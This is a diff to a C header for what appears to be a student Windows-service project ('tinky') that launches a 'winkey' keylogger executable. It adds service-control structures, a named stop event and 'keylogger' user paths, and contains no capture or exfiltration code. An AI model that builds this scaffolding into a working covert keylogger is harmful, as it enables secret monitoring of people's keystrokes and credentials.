@@ -10,13 +10,15 @@
 //#include "unicode.h"
 
 // =============== Magic variables ========== //
-#define USER_NAME TEXT(".\\surcouf")
-#define LOCALSYS TEXT("surcouf\\LocalSystem")
+#define EVENTNAME TEXT("Global\\stop_winkey_process")
+#define USER_NAME TEXT(".\\keylogger")
+#define LOCALSYS TEXT("keylogger\\LocalSystem")
 #define SVC_NAME TEXT("tinky")
 #define DEF_NAME ""
-#define WINKEY_PATH TEXT("C:\\Users\\surcouf\\Desktop\\trash\\tinky-winkey\\winkey.exe")
-#define BINARY_PATH TEXT("C:\\Users\\surcouf\\Desktop\\trash\\tinky-winkey\\prog.exe")
+#define WINKEY_PATH TEXT("C:\\Users\\keylogger\\Desktop\\trash\\tinky-winkey\\winkey.exe")
+#define BINARY_PATH TEXT("C:\\Users\\keylogger\\Desktop\\trash\\tinky-winkey\\prog.exe")
 // global {
+#define NONE 0
 #define FAILURE 0
 #define SUCCESS 1
 // }
@@ -26,9 +28,22 @@
 // ============================================= //
 
 // =============== Structs =============== //
+#pragma pack(1)
 typedef struct tinky {
+	// install {
 	SC_HANDLE	HServiceControlManager;
 	SC_HANDLE	HService;
+	WORD		onSingleProcess;
+	// }
+
+	// start {
+	SERVICE_STATUS			svcStatus;
+	SERVICE_STATUS_HANDLE	svcStatusHandle;
+	HANDLE					svcStopEventHandle;
+	HANDLE					eventHandle;
+	STARTUPINFO 			startupInfo;
+	PROCESS_INFORMATION 	processInfo;
+	// }
 }	tinky_t;
 // ============================================= //
 
@@ -39,4 +54,4 @@ int start(tinky_t *tinky);
 
 // =============== service control managed =============== //
 #define BIN_NAME ".\\winkey"
-int startedBySCM(tinky_t *tinky);
+int startedBySCM(void);
